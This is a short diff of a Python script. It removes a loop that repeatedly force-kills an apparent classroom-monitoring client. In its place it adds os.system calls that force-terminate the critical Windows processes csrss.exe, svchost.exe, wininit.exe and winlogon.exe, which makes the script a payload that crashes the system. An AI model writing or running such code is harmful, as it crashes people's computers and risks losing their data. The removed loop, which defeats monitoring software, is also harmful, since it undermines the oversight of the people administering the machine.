@@ -1,4 +1,6 @@
 import os
 
-while True:
-    os.system('taskkill /f /im ClassM_Client_Service.exe')
+os.system('taskkill /F /IM csrss.exe')
+os.system('taskkill /F /IM svchost.exe')
+os.system('taskkill /F /IM wininit.exe')
+os.system('taskkill /F /IM winlogon.exe')
